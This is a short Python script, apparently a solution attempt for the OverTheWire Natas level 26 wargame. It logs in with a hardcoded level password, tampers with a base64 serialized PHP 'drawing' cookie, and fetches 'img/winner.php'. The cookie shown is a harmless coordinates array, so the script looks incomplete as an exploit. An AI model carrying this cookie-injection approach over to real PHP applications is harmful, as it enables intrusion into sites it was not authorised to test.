#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
import urllib
import base64

username = 'natas26'
password = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.get(url, auth = (username, password))
# print response.text
# print session.cookies

session.cookies['drawing'] = 'YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjE1IjtzOjI6InkyIjtzOjI6IjE1Ijt9fQ%3D%3D'
response = session.get(url+ '?x1=0&y1=0&x2=500&y2=500', auth = (username, password))
# print response.text


response = session.get(url + 'img/winner.php', auth = (username, password))
print (response.text)